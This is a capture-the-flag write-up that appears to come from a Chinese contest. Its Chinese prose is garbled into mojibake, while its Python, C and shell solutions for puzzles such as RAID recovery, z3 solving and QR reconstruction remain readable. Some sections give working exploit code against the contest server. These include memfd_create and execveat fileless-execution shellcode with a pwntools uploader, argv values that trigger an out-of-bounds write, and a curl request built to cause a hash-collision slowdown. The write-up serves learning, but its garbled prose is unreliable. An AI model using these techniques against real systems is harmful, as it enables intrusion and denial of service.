    [189,189,189,189,189,33,189,33,33,189,189,189],
    [189,189,189,33,33,189,189,33,33,33,189,189],
    [189,134,33,33,189,189,189,189,33,33,189,189],
    [189,144,33,33,189,189,189,189,33,189,189,189],
    [189,142,33,33,189,189,189,189,33,33,33,189],
    [189,100,142,33,189,189,189,189,33,33,33,189],
    [189,142,142,189,189,189,189,189,189,33,189,189],
    [189,59,142,33,189,189,189,189,33,189,189,189],
    [189,189,33,33,189,189,189,189,189,189,189,189]
]

disablemap = [
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
    [0,0,0,0,0,0,0,0,0,0,0,0],
]

core = [
    [0,0,1,0,0],
    [0,0,2,0,0],
    [1,2,3,2,1],
    [0,0,2,0,0],
    [0,0,1,0,0]
]

targetscore = 0


def generate_matrix(core, disablemap):
    matrix = [[0]*144 for _ in range(144)]
    for i in range(12):
        for j in range(12):
            if disablemap[i][j]:
                continue
            for x in range(-2, 3):
                for y in range(-2, 3):
                    if (0 <= (i+x) < 12) and (0 <= (j+y) < 12):
                        matrix[12*(i+x)+(j+y)][12*i+j] += core[x+2][y+2]
    return matrix


matrix = generate_matrix(core, disablemap)

b = [BitVec(f"{i}_{j}",8) for i in range(12) for j in range(12)]

mulresult = [None]*144

for i in range(144):
    mulresult[i] = 0
    for j in range(144):
        mulresult[i] += matrix[i][j] * b[j]

s = Solver()

for i in range(12):
    for j in range(12):
        s.add(mulresult[12*i+j] == targetmap[i][j])
        
print(s.check())
m = s.model()

print(m)


answer = [[m[b[12*i+j]].as_long() for j in range(12)] for i in range(12)]
print(answer)

headers = {
    "Cookie" : "session=<>"
}
data = {
    "level":"0",
    "solution" : str(answer)
}
r = requests.post("http://202.38.93.111:12768/submit", data=data, headers=headers)
print(r.text)
```

### Level 1
è¿™å…³z3è§£ä¸åŠ¨äº†  
çŸ©é˜µä¹˜æ³•é™¤äº†å¯ä»¥ç†è§£ä¸ºæ¨¡256ç©ºé—´çº¿æ€§æ–¹ç¨‹ç»„çš„è¿‘ä¼¼è§£ï¼Œè¿˜å¯ä»¥ç†è§£ä¸ºå¯»æ‰¾æ¨¡256ç©ºé—´ä¸‹çš„è‹¥å¹²ä¸ªå‘é‡æœ€æ¥è¿‘ç›®æ ‡å‘é‡çš„çº¿æ€§ç»„åˆã€‚  
è€ƒè™‘åˆ°äº†æ ¼åŸºè§„çº¦ï¼Œä½†ä¸ç¡®å®šæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œå†åŠ ä¸ŠLLLå®åœ¨ç”¨çš„ä¸ç†Ÿï¼Œå°±æ²¡å»å°è¯•ã€‚  

### Level 2
ï¼ˆåŒä¸Šï¼‰


## åªè¯»æ–‡ä»¶ç³»ç»Ÿ
Linuxä¸Šçš„æ— æ–‡ä»¶æ‰§è¡Œï¼Œç»å…¸çš„ `memfd_create` + `execveat` [here](https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2021-Finals/babalogin/src/babalogin.c )  
ï¼ˆé¢˜ç›®ç»™äº†è¿œç¨‹å†…æ ¸ç‰ˆæœ¬ä¹Ÿæ˜¯ä¸€ç§æç¤ºï¼‰  

shellcodeï¼šï¼ˆæœ‰Cï¼Œæœ‰ç¼–è¯‘å™¨ï¼Œä¸ºä»€ä¹ˆè¿˜è¦æ‰‹å†™æ±‡ç¼–å‘¢ï¼‰
```c
#include "tinylib.h"

int main(void) {
	write(1, "expexp", 6);
	int fd = memfd_create("", 0);
	int total = 0;
	char buf[4096];
	while (total != 16744) {
		int r = read(0, buf, 4096);
		write(fd, buf, r);
		total += r;
	}
	execveat(fd, "", NULL, NULL, AT_EMPTY_PATH);
	return 0;
}
```
ç”¨ [https://github.com/hzqmwne/tinyelf](https://github.com/hzqmwne/tinyelf ) ç¼–è¯‘æˆshellcode  

ä¸æœåŠ¡å™¨äº¤äº’ï¼š
```python
from pwn import *

s = remote("202.38.93.111", 10106)

s.sendlineafter(b"Please input your token:", b"<>")

with open("shellcode.textbin", "rb") as f:
    payload1 = f.read()

with open("hello", "rb") as f:
    hello_binary = f.read()

s.sendafter(b"Starting challenge...", payload1)
s.sendafter(b"expexp", hello_binary)

s.interactive()
```

ï¼ˆæ‰‹æ…¢äº†å‡ åˆ†é’Ÿæ²¡æŠ¢åˆ°ä¸€è¡€ï¼‰


## ä¸€çŸ³äºŒé¸Ÿ
unsafeé€šå¸¸æ˜¯å»æ‰äº†è¾¹ç•Œæ£€æŸ¥ï¼Œé€ æˆè¶Šç•Œ  
éšä¾¿ç»™å‚æ•°ï¼Œä¾‹å¦‚ `./runme 4294967295 101` ï¼Œè§¦å‘äº†segmentation fault  

gdbè°ƒè¯•ï¼Œsegmentation fault å‘ç”Ÿåœ¨ ` 0x4094fc    mov    qword ptr [rbx + rcx*8 + 0x10], rax`ï¼Œè¿™é‡Œçš„åç§»rcxå°±æ˜¯è¾“å…¥è½¬æ¢ä¸ºæœ‰ç¬¦å·64ä½æ•´æ•°å€¼ï¼Œå®Œå…¨å¯æ§ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªä»»æ„åœ°å€å†™å…¥ã€‚  
ä¸€å¼€å§‹å°è¯•ä¿®æ”¹vectorå†…éƒ¨è¡¨ç¤ºé•¿åº¦çš„å€¼ï¼Œå‘ç°æ²¡æœ‰æ•ˆæœã€‚å¯¹vectoré‡Œçš„å†…å­˜ä¸‹ç¡¬ä»¶è¯»æ–­ç‚¹ï¼Œæ‰¾åˆ°äº† `0x4095E5`ï¼Œè¿™é™„è¿‘æ˜¯è®¡ç®—vectorä¸­0çš„ä¸ªæ•°çš„ä»£ç å¾ªç¯ï¼Œvectorçš„é•¿åº¦100å·²ç»å†…è”åˆ°ä»£ç ä¸­äº†ã€‚  

å°è¯•ä¿®æ”¹vectorå†…éƒ¨æŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚å¼€å¯ASLRå¤šæ¬¡è°ƒè¯•å‘ç°è¯¥æŒ‡é’ˆï¼ˆå³0x4094cå¤„çš„rbxï¼‰çš„å€¼æ°¸è¿œä¸å˜ã€‚  
æ³¨æ„0x409568ï¼Œå‘ç°è®¡ç®—0çš„ä¸ªæ•°çš„å¾ªç¯å¤„çš„0x4095ebçš„raxæ¥è‡ªäºrbp+0x10ï¼Œè¿™ä¸ªå€¼ä¹Ÿæ˜¯å›ºå®šä¸å˜çš„ï¼Œå› æ­¤åˆ©ç”¨ä»»æ„å†™æŠŠå®ƒæ”¹åˆ°ä¸€æ®µåŒ…å«è¾ƒå¤šçš„é0æ•°çš„åœ°æ–¹å³å¯ã€‚  

æœ¬åœ° `./runme 126734 283468912456` åœ¨Ubuntu 20.04ã€Ubuntu 18.04 éƒ½èƒ½æˆåŠŸï¼Œä½†è¿œç¨‹éƒ½ä¸è¡Œï¼Œæ€€ç–‘è¿œç¨‹æ˜¯dockerç¯å¢ƒçš„åŸå› ï¼Œæœ¬åœ°å¯dockeréªŒè¯ç¡®å®å¦‚æ­¤ã€‚  
å¾®è°ƒåç§»é‡ï¼Œå‘ç° `./runme 126732 283468912456` å¯ä»¥æ‰“é€šè¿œç¨‹ã€‚  


## Micro World
å‘ç°æ˜¯pyinstalleræ‰“åŒ…çš„å¯æ‰§è¡Œç¨‹åºï¼Œç”¨pyinstxtractorè§£åŒ…  
ä¸»ç¨‹åºæ˜¯2.pycï¼Œç”¨decompyle3åç¼–è¯‘ï¼ˆçœ‹é¢˜è§£å¾ˆå¤šäººéƒ½ç”¨çš„æ˜¯uncompyle6ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·çš„ä½œè€…è‡ªå·±éƒ½å»ºè®®Python 3.7ä»¥ä¸Šæ”¹ç”¨decompyle3 [see here](https://github.com/rocky/python-uncompyle6 )ï¼‰  
ï¼ˆä»¥åŠï¼Œçœ‹åˆ°æŸäº›é¢˜è§£è¯´åç¼–è¯‘å®Œçš„ä»£ç éœ€è¦å°ä¿®æ”¹æ‰èƒ½è·‘ï¼Œä½†æœ¬äººæ²¡æœ‰é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼‰  

é¢˜ç›®å®ç°äº†ä¸€ä¸ªç²’å­ç³»ç»Ÿï¼Œåªè¦æŠŠåˆé€Ÿåº¦åå‘å³å¯åå‘æ¨æ¼”ï¼Œå¤§çº¦åå‘28ä¸ªå¾ªç¯å³å¯å¤§è‡´çœ‹å‡ºflagçš„å½¢çŠ¶ã€‚  

ç²’å­æ‹¼æˆçš„flagçš„å½¢çŠ¶æéš¾è¾¨è®¤ï¼Œç»åå¤å°è¯•æ‰å‹‰å¼ºæå‡ºæ¥ï¼Œä¸€åº¦ä»¥ä¸ºè§£æ³•æ˜¯ä¸æ˜¯éé¢„æœŸï¼ˆç„¶è€Œèµ›åçœ‹åˆ°è‡ªå·±æ¢å¤å‡ºæ¥çš„å›¾å’Œå®˜æ–¹writeupçš„å›¾å®Œå…¨ä¸€è‡´â€¦â€¦ï¼‰  


## å·ç‹ä¸é‡ç”Ÿçš„ GPA

IDAé€†å‘elfæ–‡ä»¶ï¼Œæ‰¾åˆ°decryptå‡½æ•°ï¼Œæå–æ•°æ®æ‰‹åŠ¨è·‘ä¸€éã€‚  
ä¸æƒ³æ‰‹åŠ¨è§£æå±å¹•è¾“å‡ºç¼“å†²åŒºçš„æ•°æ®æ ¼å¼ï¼Œäºæ˜¯åœ¨gbaæ–‡ä»¶é‡Œæ‰¾åˆ°æ‰€æœ‰é¢„å­˜çš„ç”»é¢å¹¶è¦†ç›–æ‰ï¼ˆæœ‰çš„è¦†ç›–åä¼šå‡ºé”™ï¼Œè·³è¿‡å³å¯ï¼‰ï¼Œç”¨æ¨¡æ‹Ÿå™¨æ‰“å¼€å³å¯çœ‹åˆ°flagã€‚  

```python
with open("catchGPA.elf", "rb") as f:
    allcontent = f.read()

def p16(n):
    n &= 0xffff
    return n.to_bytes(2, "little")

def u16(s):
    assert len(s) == 2
    return int.from_bytes(s, "little")

key_raw = allcontent[0x16214:0x16214+11520*2]
flagenc_raw = allcontent[0x10814:0x10814+11520*2]

# 11520 = 144*80

flagdec = [None]*11520

for i in range(11520):
    index = u16(key_raw[i*2:i*2+2])
    flagdec[i] = u16(flagenc_raw[index*2:index*2+2])

flagdec_raw = b"".join(map(p16, flagdec))

with open("catchGPA.gba", "rb") as f:
    allcontent2 = f.read()

with open("catchGPA_patched.gba", "wb") as f:
    f.write(allcontent2)
    last = -1
    while True:
        last = allcontent2.find(b"\x28\x25\xe6\x1c", last+1)
        print(last)
        if last == -1 or index > 100000000000:
            break
        f.seek(last)
        f.write(flagdec_raw)
```


## é˜µåˆ—æ¢å¤å¤§å¸ˆ

### 1 - RAID 0

å…ˆè¿‡äº† RAID 5 å†çœ‹çš„ RAID 0ï¼Œä½†ä¸ªäººè§‰å¾—æ‰‹åŠ¨åšè¿˜æ˜¯ RAID 0 æ›´ç®€å•ï¼ˆç”¨å·¥å…·çš„è¯å¯èƒ½ RAID 5 æ¯” RAID 0 å¥½åšä¸€ç‚¹ï¼‰  

åŒæ ·å…ˆæ‰¾è¿ç»­çš„æ–‡æœ¬ï¼š
```
wlOUASom2fI.img [0x8c0000, 0x8e0000)
jCC60mutgoE.img [0x8c0000, 0x8e0000)
```
```
1GHGGrmaMM0.img [0x8c0000, 0x8e0000)
5qiSQnlrA4Y.img [0x8c0000, 0x8e0000)
d3Be7V0EVKo.img [0x8c0000, 0x8e0000)
```
```
eRL2MQSdOjo.img [0x8c0000, 0x8e0000)
RApjvIxRlu0.img [0x8c0000, 0x8e0000)
```
```
ID7sM2RWkyI.img [0x8c0000, 0x8e0000)
```
å¯ä»¥åˆ†æˆå¦‚ä¸Šçš„å››ç»„ï¼Œç¡®å®šæ¡å¸¦å¤§å°ä¸º128KB(0x20000)ã€‚  
é€šè¿‡GPTåˆ†åŒºè¡¨å’Œå¤‡ä»½åˆ†åŒºè¡¨ï¼Œç¡®å®š wlOUASom2fI.img æ˜¯ç¬¬ä¸€å—ç›˜ï¼ŒID7sM2RWkyI.img æ˜¯æœ€åä¸€å—ç›˜ã€‚  
ä¸­é—´ç¬¬äºŒç»„å’Œç¬¬ä¸‰ç»„çš„é¡ºåºä¸ç¡®å®šï¼Œä¸¤ç§æƒ…å†µéƒ½è¯•ä¸€ä¸‹å³å¯ã€‚  

æœ€åå†™ç¨‹åºåˆå¹¶ä¸ºä¸€å—ç£ç›˜ï¼š
```python
def recover_raid0(disklist, blocksize):
    total_size = 0
    for d in disklist:
        assert len(d) % blocksize == 0
        total_size += len(d)
    raidnum = len(disklist)
    assert total_size == len(disklist[0])*raidnum
    blockcount = total_size // blocksize
    r = bytearray(blockcount*blocksize)
    for i in range(blockcount):
        d = disklist[i % raidnum]
        block = d[(i//raidnum)*blocksize:(i//raidnum+1)*blocksize]
        assert len(block) == blocksize
        r[i*blocksize:(i+1)*blocksize] = block
    return r

filelist = [
    "wlOUASom2fI.img",
    "jCC60mutgoE.img",
    "1GHGGrmaMM0.img",
    "5qiSQnlrA4Y.img",
    "d3Be7V0EVKo.img",
    "eRL2MQSdOjo.img",
    "RApjvIxRlu0.img",
    "ID7sM2RWkyI.img",        
]

disklist = []
for s in filelist:
    with open(s, "rb") as f:
        disklist.append(f.read())

r = recover_raid0(disklist, 128*1024)

with open("result.img", "wb") as f:
    f.write(r)
```

### 2 - RAID 5

çœ‹åˆ° RAID 5 è¿‡çš„äººå¤šå°±å…ˆçœ‹äº†è¿™ä¸ªã€‚  

RAID5å¸ƒå±€æ–¹å¼ä»‹ç»åŠå¯¹æ€§èƒ½çš„å½±å“  
[https://zohead.com/archives/raid5-layout-performance](https://zohead.com/archives/raid5-layout-performance )  
```
å·¦å¯¹ç§°ï¼š
  0  1  2  3  P
  5  6  7  P  4
 10 11  P  8  9
 15  P 12 13 14
  P 16 17 18 19
å·¦ä¸å¯¹ç§°ï¼š
  0  1  2  3  P
  4  5  6  P  7
  8  9  P 10 11
 12  P 13 14 15
  P 16 17 18 19
å³å¯¹ç§°
  P  0  1  2  3
  7  P  4  5  6
 10 11  P  8  9
 13 14 15  P 12
 16 17 18 19  P
å³ä¸å¯¹ç§°
  P  0  1  2  3
  4  P  5  6  7
  8  9  P 10 11
 12 13 14  P 15
 16 17 18 19  P
```

å…ˆæ‰¾è¿ç»­çš„å—ï¼ˆèµ°äº†ä¸å°‘å¼¯è·¯æ‰æƒ³åˆ°æœ€å…ˆåšçš„åº”è¯¥æ˜¯è¿™ä¸ªï¼‰ï¼Œä»æ–‡æœ¬æ–‡ä»¶å…¥æ‰‹ï¼Œè¿ç»­çš„å—æ’å¸ƒå¦‚ä¸‹ï¼š  
```
3RlmViivyG8.img [0x2b0000, 0x2c0000)

IrYp6co7Gos.img [0x2c0000, 0x2d0000)
3D8qN9DH91Q.img [0x2c0000, 0x2d0000)
QjTgmgmwXAM.img [0x2c0000, 0x2d0000)
60kE0MQisyY.img [0x2c0000, 0x2d0000)

3RlmViivyG8.img [0x2d0000, 0x2e0000)
IrYp6co7Gos.img [0x2d0000, 0x2e0000)
3D8qN9DH91Q.img [0x2d0000, 0x2e0000)
QjTgmgmwXAM.img [0x2d0000, 0x2e0000)

60kE0MQisyY.img [0x2e0000, 0x2f0000)
3RlmViivyG8.img [0x2e0000, 0x2f0000)
```
ä»¥ä¸Šå¯å¸¦æ¥çš„ä¿¡æ¯æœ‰ï¼š  
- æ¡å¸¦å¤§å°ä¸º64KB(0x10000)  
- è¿ç»­çš„æ•°æ®å—æ‰€åœ¨çš„ç›˜çš„åºå·ä¹Ÿæ˜¯è¿ç»­çš„ï¼ˆç¡®å®šæ¨¡å¼æ˜¯ å·¦å¯¹ç§° æˆ– å³ä¸å¯¹ç§°ï¼‰  
- å½“å‰æ¡å¸¦çš„æ ¡éªŒå—å’Œä¸Šä¸€æ¡å¸¦çš„æœ€åä¸€ä¸ªæ•°æ®å—ä½äºåŒä¸€å—ç£ç›˜ä¸Šï¼ˆç¡®å®šæ¨¡å¼æ˜¯ å·¦å¯¹ç§°ï¼‰  
ç›˜çš„é¡ºåºæ˜¯ 3RlmViivyG8.img, IrYp6co7Gos.img, 3D8qN9DH91Q.img, QjTgmgmwXAM.img, 60kE0MQisyY.imgï¼Œå“ªå—æ˜¯ç¬¬ä¸€å—æš‚æ—¶æœªçŸ¥

GPTåˆ†åŒºæ•°æ®æ ¼å¼åˆ†æ  
[http://www.360doc.com/content/18/0526/10/51888465_757122283.shtml](http://www.360doc.com/content/18/0526/10/51888465_757122283.shtml )  

å¯¹ç…§æœ¬åœ°çš„ç£ç›˜ï¼Œæ ¹æ®GPTåˆ†åŒºè¡¨å’Œå¤‡ä»½åˆ†åŒºè¡¨çš„æœªçŸ¥ï¼Œç¡®å®šåŸå§‹åˆ†åŒºè¡¨ä½äº 3RlmViivyG8.img æˆ– 60kE0MQisyY.img å¼€å¤´ï¼Œå¤‡ä»½åˆ†åŒºè¡¨ä½äº 3D8qN9DH91Q.img æˆ– QjTgmgmwXAM.img ç»“å°¾ã€‚  
ç»“åˆç›˜çš„é¡ºåºï¼Œç¡®å®šçœŸæ­£çš„ç¬¬ä¸€å—ç›˜æ˜¯ 3RlmViivyG8.img

å†™è„šæœ¬åˆå¹¶ä¸ºä¸€å—ç£ç›˜ï¼š
```
from pprint import pprint

def raid_map(raidnum, left=1, symmetric=1):
    rawmap = [[None for j in range(raidnum)] for i in range(raidnum)]
    reverse_rawmap = [None] * (raidnum * (raidnum-1))
    index = 0
    for i in range(raidnum):
        p_pos = raidnum-1-i if left else i
        j = p_pos if symmetric else 0
        for _ in range(raidnum):
            if j != p_pos:
                rawmap[i][j] = index
                reverse_rawmap[index] = (i, j)
                index += 1
            j = (j+1) % raidnum
    return rawmap, reverse_rawmap

def recover_raid5(disklist, blocksize, raid_reverse_rawmap):
    total_len = 0
    for d in disklist:
        assert len(d) % blocksize == 0
        total_len += len(d)
    raidnum = len(disklist)
    assert raidnum*(raidnum-1) == len(raid_reverse_rawmap)
    assert total_len == len(disklist[0])*raidnum
    blockcount = total_len*(raidnum-1) // (blocksize*raidnum)

    r = bytearray(total_len)
    for blocknum in range(blockcount):
        _, disknum = raid_reverse_rawmap[blocknum%(raidnum*(raidnum-1))]
        diskblocknum = blocknum//(raidnum-1)
        print(hex(blocknum*blocksize), blocknum%(raidnum*(raidnum-1)), disknum, hex(diskblocknum*blocksize))
        block = disklist[disknum][diskblocknum*blocksize:(diskblocknum+1)*blocksize]
        if len(block) != blocksize:
            print(len(block))
        assert len(block) == blocksize
        r[blocknum*blocksize:(blocknum+1)*blocksize] = block
    return r

diskfiles = [
    "3RlmViivyG8.img",
    "IrYp6co7Gos.img",
    "3D8qN9DH91Q.img",
    "QjTgmgmwXAM.img",
    "60kE0MQisyY.img",
]

disklist = []
for filename in diskfiles:
    with open(filename, "rb") as f:
        disklist.append(f.read())

_, left_symmetric = raid_map(5, 1, 1)

r = recover_raid5(disklist, 64*1024, left_symmetric)

with open("result.img", "wb") as f:
    f.write(r)
```


## é“¾ä¸Šé¢„è¨€å®¶
æ²¡çœ‹


## åŠ©è®°è¯

### ç¬¬ä¸€é¡¿å¤§é¤

è§¦å‘Phrase.equalsæ—¶ä¼šå¼•å…¥20msçš„å»¶æ—¶ã€‚åœ¨ä¸æ–­æ’å…¥åˆ°LinkedHashSetæ—¶ï¼Œæ ¹æ®å†…éƒ¨å®ç°ï¼Œå…ˆè®¡ç®—keyçš„hashï¼Œå¦‚æœhashé‡å¤å†è°ƒç”¨keyçš„equalsæ–¹æ³•æ¯”è¾ƒã€‚  
ç¬¬ä¸€å…³è¦æ±‚600msçš„å»¶æ—¶ï¼Œé˜…è¯»åç«¯ä»£ç å‘ç°ä¸€æ¬¡è¯·æ±‚å¯ä»¥å‘é€32ä¸ªåŠ©è®°è¯ï¼ˆå‰ç«¯åªå…è®¸1ä¸ªï¼‰ã€‚å‘é€32ä¸ªç›¸åŒçš„ï¼Œæ­£å¥½å¯ä»¥è§¦å‘31æ¬¡æ’å…¥å’Œequalsæ¯”è¾ƒã€‚  

```shell
curl 'http://202.38.93.111:10048/phrases?token=<>' --data-raw '["young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth","young year writing worth"]'
```

### ç¬¬äºŒé¡¿å¤§é¤
ç¬¬äºŒå…³è¦æ±‚9000mså»¶æ—¶ï¼ŒJavaçš„HashMapç”¨çš„æ˜¯é“¾è¡¨è§£å†³hashå†²çªï¼Œå¦‚æœæ’å…¥çš„32ä¸ªkeyéƒ½ä½äºä¸€æ¡é“¾ä¸Šï¼Œé‚£ä¹ˆæ€»çš„å»¶æ—¶æ˜¯20\*(1+2+..+31) â‰ˆ 20\*16\*32 = 10240ï¼Œåˆšå¥½å¤Ÿã€‚  
ç¿»JDKæºç æ‰¾Object.hashCodeçš„å®ç°ï¼Œåªæ‰¾åˆ°äº†Stringçš„ä¼¼ä¹åœ¨ [è¿™é‡Œ](https://github.com/openjdk/jdk17/blob/master/src/hotspot/share/classfile/javaClasses.hpp#L211 )  
ç„¶ååº”è¯¥æ˜¯æšä¸¾åŠ©è®°è¯ï¼Œè®¡ç®—å»¶æ—¶ï¼Œæ‰¾hashç¢°æ’ã€‚ä»£ç æ„Ÿè§‰ä¸å¤§å¥½å†™ï¼Œæ²¡åšã€‚  


## Co-Program

### Co-Login

å¥‡æ€ªçš„é™¤æ³•å’Œå–æ¨¡è¿ç®—è§„åˆ™ï¼ŒæŸ¥äº†ä¸‹æ˜¯ â€œHardware Interpretation of Division by zeroâ€ï¼Œz3-solver é‡Œå¯¹åº” hi_div0 é€‰é¡¹ï¼ŒBitVecæ˜¯é»˜è®¤å¯ç”¨çš„ã€‚

æ³¨æ„ä¸‹BitVecé»˜è®¤é‡è½½çš„ '/' å’Œ '%' è¿ç®—æ˜¯æœ‰ç¬¦å·æ•°ï¼Œå…¶å¯¹åº”çš„æ— ç¬¦å·è¿ç®—æ˜¯ UDiv å’Œ URem å‡½æ•°ã€‚  

å¾—ç›ŠäºPythonçš„åŠ¨æ€ç‰¹æ€§ï¼Œæ— éœ€ä¿®æ”¹z3çš„æºç æˆ–è€…æç»§æ‰¿é‡è½½ï¼Œåªéœ€è¦ä¸€ä¸ªç®€å•çš„monkey patchï¼ˆè§ä¸‹é¢ä»£ç çš„ç¬¬4å’Œ5è¡Œï¼‰
ï¼ˆåšè¿™ä¸ªpatchä¹‹å‰100ä¸ªåªèƒ½æˆåŠŸ50-60ä¸ªï¼Œpatchä¹‹åèƒ½æˆåŠŸ90å¤šä¸ªï¼‰

```
from pwn import *
from z3 import *

BitVecRef.__div__ = lambda self, other : UDiv(self, other)
BitVecRef.__mod__ = lambda self, other : URem(self, other)

def solve(express, ans):
    x = BitVec("x", 36)
    y = BitVec("y", 36)
    z = BitVec("z", 36)
    i = BitVec("i", 36)
    j = BitVec("j", 36)
    k = BitVec("k", 36)

    s = Solver()
    s.add(eval(express, globals(), locals()) == ans)
    
    if s.check() == sat:
        m = s.model()
        print(m)
        r = []
        if "x" in express:
            tmp = m[x]
            r.append(f"x={1 if tmp is None else tmp.as_long()}")
        if "y" in express:
            tmp = m[y]
            r.append(f"y={1 if tmp is None else tmp.as_long()}")
        if "z" in express:
            tmp = m[z]
            r.append(f"z={1 if tmp is None else tmp.as_long()}")
        if "i" in express:
            tmp = m[i]
            r.append(f"i={1 if tmp is None else tmp.as_long()}")
        if "j" in express:
            tmp = m[j]
            r.append(f"j={1 if tmp is None else tmp.as_long()}")
        if "k" in express:
            tmp = m[k]
            r.append(f"k={1 if tmp is None else tmp.as_long()}")
        return " ".join(r)

    return ""


s = remote("202.38.93.111", 10700)

s.sendlineafter(b"Please input your token:", b"<>")
s.recvuntil(b"Welcome to Macrohard 36-bit computer!\n")

for i in range(100):
    express = s.recvline().decode().strip()
    ans = int(s.recvline().decode().strip())
    print(i, express, ans)
    r = solve(express, ans)
    print(r, len(r))
    s.sendline(r.encode())

s.interactive()
```

### Co-UnitTest

å…è®¸ifï¼Œå°±å¯ä»¥å¾ˆæš´åŠ›ï¼Œåˆ¤æ–­è¾“å…¥ç­‰äºå“ªä¸ªæ•°ç„¶åç›´æ¥ç»™ç­”æ¡ˆï¼š
```
if (x == x[0]):
    return ans[0]
else:
    if (x == x[1]):
		return ans[1]
	else:
		...
```

æ‰€ä»¥ï¼Œåªéœ€è¦æ„é€ å‡ºå¸¸æ•°å³å¯ã€‚  
å€Ÿé‰´äº†å»å¹´ [è¶…ç²¾å·§çš„æ•°å­—è®ºè¯å™¨](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E8%B6%85%E7%B2%BE%E5%B7%A7%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%BA%E8%AF%81%E5%99%A8/README.md )
çš„æ„é€ æ–¹æ³•ï¼ŒæŠŠæ•´æ•°æ‹†åˆ†ä¸ºå½¢å¦‚`(((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f`çš„åè¿›åˆ¶æ ¼å¼ã€‚  
`x/x`ä¸º1ï¼Œ1ç”Ÿä¸‡ç‰©ï¼Œæ„é€ ç»“æŸã€‚  

```python
from pwn import *
context.log_level = "DEBUG"
import re

def CONST0():
    return "x/x-x/x"

def CONST1():
    return "x/x"

def CONST10():
    return "x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x+x/x"

def CONST(n):
    if n == 0:
        return CONST0()
    assert 1 <= n <= 10
    return "+".join(CONST1() for i in range(n))


def ADD(a,b):
    return f"{a}+{b}"

def MUL(a, b):
    return f"({a})*({b})"

def MOD(a, b):
    return f"({a})%({b})"

def DIV(a,b):
    return f"({a})/({b})"

def NUM(n):
    if not n//10:
        return CONST(n%10)
    return ADD(MUL(NUM(n//10),CONST(10)),CONST(n%10))



def IF(x, a, b):
    return f"if({x},{a},{b})"

def EQ(a, b):
    return f"{a}={b}"

def AND(a, b):
    return f"{a}&&{b}"


def solve(s):
    # s is list of tuple(x,y,ans)
    # if(x0,ans0,if(x1,ans1,if(x2,ans2,if(x3,ans3,if(x4,ans4)))))
    if len(s) == 1:
        return NUM(s[0][2])
    '''
    return IF(
                AND(
                    EQ(MOD("x",CONST(10)), NUM(s[0][0]%10) ),
                    EQ(MOD("y",CONST(10)), NUM(s[0][0]%10) )
                ),
                NUM(s[0][2]),
                solve(s[1:])
            )
    '''
    return IF(
                EQ("x",NUM(s[0][0])),
                NUM(s[0][2]),
                solve(s[1:])
            )

def parse(line):
    r = re.findall(r"x=(\d+), y=(\d+), ans=(\d+)", line)[0]
    return tuple(map(int,r))

s = remote("202.38.93.111", 10800)
s.sendlineafter(b"Please input your token:", b"<>")

while True:
    s.recvuntil(b"Challenge!\n")
    values = []
    for i in range(5):
        r = s.recvline()
        values.append(parse(r.decode()))
    s.sendline(solve(values))
```


## é©¬èµ›å…‹

å¯¹åŸå›¾æœªçŸ¥çš„å—çš„é¢œè‰²è®¾æœªçŸ¥æ•°ï¼ŒæŒ‰ç…§é©¬èµ›å…‹çš„ç®—æ³•åˆ—æ–¹ç¨‹ï¼ˆä¸ºäº†ç¡®ä¿è¿ç®—åœ¨æ•´æ•°èŒƒå›´å†…ï¼Œä¸è®¡ç®—å¹³å‡å€¼çš„é™¤æ³•ï¼Œè€Œæ˜¯æŠŠæœ€ç»ˆé¢œè‰²ä¹˜ä¸Šç‚¹çš„æ•°é‡ï¼‰ã€‚  
æœªçŸ¥çš„é¢œè‰²åªæœ‰0æˆ–255ä¸¤ç§å–å€¼ï¼Œå¤§æ¦‚åˆæ˜¯ä¸€ç±»æ•´æ•°çº¿æ€§æ–¹ç¨‹æ±‚è§£çš„é—®é¢˜ã€‚  
DFSã€BFSä¹‹ç±»çš„ç®—æ³•åº”è¯¥å¾ˆæœ‰æ•ˆï¼Œä½†æ˜¯ç®—æ³•å¤ªå¤æ‚ä¸æƒ³å†™ã€‚ç›´æ¥ä¸¢ç»™z3æ±‚è§£ï¼Œå‡ åˆ†é’Ÿçš„é€Ÿåº¦è¿˜èƒ½æ¥å—ã€‚  

```python
from PIL import Image
from z3 import *

im = Image.open("pixelated_qrcode.bmp")
im = im.convert("RGB")

a = [[None]*57 for _ in range(57)]
b = [[None]*20 for _ in range(20)]

assert 57*11 == 627

for x in range(627):
    for y in range(627):
        i = x // 11
        j = y // 11
        rgb = im.getpixel((y,x))
        assert rgb[0]==rgb[1]==rgb[2]
        if rgb[0] in [0,255]:
            if a[i][j] is None:
                a[i][j] = rgb[0]
            assert a[i][j] == rgb[0]
            
        if 103 <= x < 103+20*23 and 137 <= y < 137+20*23:
            i = (x-103)//23
            j = (y-137)//23
            if b[i][j] is None:
                b[i][j] = rgb[0]
            assert b[i][j] == rgb[0]
    
print(a)
print(b)

s = Solver()

values = {}

for i in range(57):
    for j in range(57):
        if a[i][j] is None:
            tmp = Int(f"a_{i}_{j}")
            values[(i,j)] = tmp
